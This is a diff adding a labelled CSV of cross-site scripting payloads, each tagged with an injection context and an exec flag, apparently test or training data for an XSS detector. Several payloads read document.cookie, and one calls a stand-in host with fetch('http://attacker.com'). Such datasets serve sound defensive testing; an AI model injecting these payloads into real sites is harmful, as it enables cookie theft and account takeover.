@@ -1,0 +1,49 @@
+payload,context,exec
+javascript:alert(1),html_tag,0
+<img src=x onerror=alert(document.URL)>,html_tag,1
+<img src=x onerror=alert(1)//>,html_attribute,0
+<script>alert(1)</script>,html_tag,1
+<details open ontoggle=alert(1)>,html_tag,1
+"""><img src=x onerror=confirm(1)>",html_attribute,1
+'><svg/onload=alert(1)>,html_attribute,1
+</title><svg/onload=alert(1)>,html_tag,1
+<script>fetch('http://attacker.com')</script>,html_tag,1
+&#x3C;script&#x3E;,html_tag,0
+><svg/onload=alert(1)>,url_href,0
+<meter onmouseover=alert(1)>,url_href,0
+"data:text/html,<svg/onload=alert(1)>",script_block,0
+<script>alert(document.cookie)</script>,html_tag,1
+autofocus onfocus=alert(1) x=,script_block,0
+<iframe>,html_text,0
+category=electronics,html_text,0
+<svg/onload=alert`XSS`>,html_tag,1
+<<>>,html_text,0
+<audio src=x onerror=alert(1)>,html_tag,1
+javascript:prompt(1),html_attribute,0
+"""mixed'quotes""",html_text,0
+;alert(1);//,html_attribute,0
+<script>alert`1`</script>,html_tag,1
+"data:text/html,<script>confirm(1)</script>",url_navigation,1
+"data:text/html,<script>prompt(1)</script>",url_href,0
+<img src=x>,script_block,0
+%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_attribute,0
+""" onfocus=alert(1) autofocus """,html_attribute,1
+&#60;script&#62;,html_tag,0
+<script>alert(1),html_attribute,0
+<script>this.alert(1)</script>,html_tag,1
+<svg/onload=confirm`1`>,html_tag,1
+javascript:alert(String.fromCharCode(49)),url_href,1
+<img src=x onerror=alert&#40;1&#41;>,html_tag,1
+<video>,html_text,0
+<svg/onload=alert(String.fromCharCode(49))>,url_href,0
+javascript:prompt(1),script_block,0
+"data:text/html,<script>prompt(1)</script>",html_attribute,0
+""" onmouseover=alert(1) """,html_attribute,1
+""" onclick=alert(1) """,html_attribute,1
+<img src=x onerror=prompt(1)>,html_tag,1
+javascript:alert(navigator.userAgent),url_href,1
+<svg onload=alert(document.cookie)>,html_tag,1
+"data:text/html,<img src=x onerror=alert(1)>",html_tag,0
+"<a href=""javascript:"">",html_text,0
+"data:text/html,<script>alert(document.domain)</script>",url_navigation,1
+<script>window.alert(1)</script>,html_tag,1
